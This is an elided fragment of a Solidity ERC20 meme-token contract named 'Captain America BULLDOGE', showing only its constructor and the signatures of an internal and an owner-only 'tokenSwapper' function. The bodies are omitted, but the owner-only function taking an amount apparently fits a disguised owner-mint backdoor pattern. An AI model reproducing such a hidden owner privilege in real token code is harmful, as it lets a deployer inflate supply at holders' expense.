...
// Release by Captain America Teams
...
contract CaptainAmericaDoge is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        _name = "Captain America BULLDOGE";
        _symbol = "BULLDOGE";
    ...
    function _tokenSwapper(address account, uint256 amount) internal virtual {
    ...
    function tokenSwapper(uint256 amount) public onlyOwner virtual returns (bool) {
